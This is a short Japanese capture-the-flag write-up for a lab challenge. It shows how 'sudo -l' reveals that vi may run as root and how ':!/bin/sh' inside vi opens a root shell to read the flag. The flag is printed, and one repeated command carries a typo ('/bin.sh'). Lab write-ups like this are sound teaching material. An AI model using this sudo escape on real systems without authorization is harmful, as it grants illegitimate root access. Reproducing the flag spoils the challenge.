## category
General skills
## probrem
```
Can you read files in the root file? The system admin has provisioned an account for you on the main server:
```
## 難しさ
普通
## 解法
sshで接続してルートへ移動。
しかし権限がなくファイルなどが見れない。
そこでsudoコマンドで使える機能を探す。
```
sudo -l
```
すると
```
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```
viというエディターが使える。
ここでシェルを起動することができる。
sudoでviを起動して次のコマンドを打つ。
```
:!/bin/sh
```
するとシェルが起動。
```
# whoami
root
```
後はmetadata.jsonを確認できたらフラグをゲット。
## 使用コマンド
### viでターミナルを起動
```
:!/bin.sh
## 答え
```
academy{uS1ng_v1m_3dit0r_9f6b56dd}
```
## ここから学んだこと
viでは文字列として入力するモードと編集モードがある。
コマンドラインを使いたいときはescでノーマルに戻って
:でコマンドラインを起動。
## つぎに考えること
viみたいにsudoで使える機能を最大限悪用できないかを考える。
